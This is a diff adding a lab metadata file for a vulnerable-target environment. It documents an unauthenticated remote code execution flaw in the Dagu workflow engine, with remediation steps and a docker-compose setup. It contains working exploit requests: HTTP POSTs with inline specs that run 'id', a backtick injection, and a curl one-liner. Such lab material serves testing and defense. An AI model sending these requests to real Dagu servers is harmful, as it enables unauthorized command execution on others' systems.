@@ -1,0 +1,138 @@
+id: vt-dagu
+
+info:
+  name: "Dagu Workflow Engine - Unauthenticated Remote Code Execution"
+  author: omarkurt
+  description: |  
+    GHSA-6qr9-g2xw-cw92 is a critical unauthenticated remote code execution vulnerability
+    in Dagu (dagu-org/dagu), a powerful DAG workflow execution engine.
+
+    The application ships with authentication disabled by default. The POST /api/v2/dag-runs
+    endpoint accepts inline YAML DAG specifications and immediately executes shell commands
+    without requiring any credentials.
+
+    Three distinct issues were identified:
+    1. Unauthenticated RCE (Default Configuration) - Auth is disabled by default, allowing
+       anyone to submit inline specs and execute arbitrary commands.
+    2. Operator Privilege Escalation - Even with auth enabled, operators (restricted role)
+       can submit inline specs to bypass write restrictions.
+    3. Backtick Command Injection - Step parameters are evaluated with shell backtick
+       expansion without sanitization.
+  targets:
+    - dagu
+    - dagu-workflow-engine
+  type: GHSA
+  ghsa: GHSA-6qr9-g2xw-cw92
+  cwe: CWE-306
+  cvss:
+    score: 9.8
+    severity: critical
+  affected_versions:
+    - "<= 1.30.3"
+  tags:
+    - dagu
+    - rce
+    - unauth
+    - missing-auth
+    - critical
+    - ghsa-2025
+    - workflow-engine
+  references:
+    - https://github.com/advisories/GHSA-6qr9-g2xw-cw92
+    - https://github.com/dagu-org/dagu
+    - https://vulnerabletarget.com/vt-dagu
+
+vulnerabilities:
+  - id: 1
+    name: "Unauthenticated RCE via Inline DAG Spec"
+    endpoint: /api/v2/dag-runs
+    method: POST
+    param: spec
+    request: |
+      POST /api/v2/dag-runs HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/json
+
+      {"name":"vt-poc","spec":"steps:\n  - name: rce\n    command: id\n"}
+    response: |
+      HTTP/1.1 200 OK
+      Content-Type: application/json
+
+      {"dagRunId":"<uuid>"}
+
+  - id: 2
+    name: "Backtick Command Injection"
+    endpoint: /api/v2/dag-runs
+    method: POST
+    param: spec
+    request: |
+      POST /api/v2/dag-runs HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/json
+
+      {"name":"vt-inject","spec":"steps:\n  - name: inject\n    command: echo `id`\n"}
+    response: |
+      HTTP/1.1 200 OK
+      Content-Type: application/json
+
+      {"dagRunId":"<uuid>"}
+
+  - id: 3
+    name: "API Accessible Without Auth"
+    endpoint: /api/v2/dags
+    method: GET
+    request: |
+      GET /api/v2/dags HTTP/1.1
+      Host: {{Hostname}}
+      Accept: application/json
+    response: |
+      HTTP/1.1 200 OK
+      Content-Type: application/json
+
+      {"dags":[...]}
+
+technical: |
+  The vulnerability exists because Dagu ships with authentication disabled by default.
+  The /api/v2/dag-runs endpoint accepts a JSON body with an inline YAML "spec" field
+  that defines DAG steps, including shell commands to execute.
+
+  Attack flow:
+  1. Attacker sends POST /api/v2/dag-runs with inline YAML spec
+  2. Dagu parses the spec and creates a DAG run
+  3. The "command" field in each step is executed as a shell command
+  4. Command output is available via the DAG run status API
+
+  Additionally, step parameters support backtick expansion, allowing command injection
+  even in fields that aren't directly intended for command execution.
+
+impact: |
+  Critical impact due to CVSS 9.8 severity:
+
+  - Full remote code execution without authentication
+  - Any network-accessible Dagu instance is "fully compromised by default"
+  - Command execution with the privileges of the Dagu process user
+  - Potential for container escape if running with elevated privileges
+  - Access to internal network resources if Dagu has network access
+  - Data exfiltration via executed commands
+
+remedy: "Enable authentication (DAGU_AUTH_MODE=builtin) and restrict network access"
+
+remediation:
+  - "Enable authentication: Set DAGU_AUTH_MODE=builtin and configure credentials"
+  - "Do not expose Dagu to the internet without authentication"
+  - "Use firewall rules to restrict access to trusted networks"
+  - "Upgrade to a patched version when available"
+
+poc:
+  nuclei:
+    - "vt-2025-dagu-rce.nuclei.yaml"
+
+providers:
+  docker-compose:
+    path: "docker-compose.yaml"
+    port: 8080
+
+post-install:
+  - "Dagu UI: http://localhost:8080"
+  - "Use vt-2025-dagu-rce.nuclei.yaml to test for unauthenticated RCE"
+  - "Test: curl -s -X POST http://localhost:8080/api/v2/dag-runs -H 'Content-Type: application/json' -d '{\"name\":\"poc\",\"spec\":\"steps:\\n  - name: rce\\n    command: id\\n\"}'"
